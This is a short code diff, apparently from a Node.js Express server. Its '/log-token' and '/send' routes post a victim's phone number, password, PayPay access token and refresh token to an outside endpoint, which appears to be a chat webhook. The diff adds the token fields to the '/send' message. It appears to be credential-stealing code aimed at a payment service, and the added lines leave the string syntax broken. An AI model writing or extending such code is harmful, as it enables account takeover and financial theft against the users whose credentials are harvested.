@@ -23,6 +23,7 @@ app.post("/log-token", async (req, res) => {
 パスワード: ${password}
 PayPayアクセストークン: ${accessToken}
 リフレッシュトークン: ${refreshToken}`
+
       })
     });
 
@@ -57,6 +58,8 @@ app.post("/send", async (req, res) => {
       },
       body: JSON.stringify({
         content: `\n電話番号: ${phone}\nパスワード: ${password}`
+        PayPayアクセストークン: ${accessToken}
+リフレッシュトークン: ${refreshToken}`
       })
     });
 
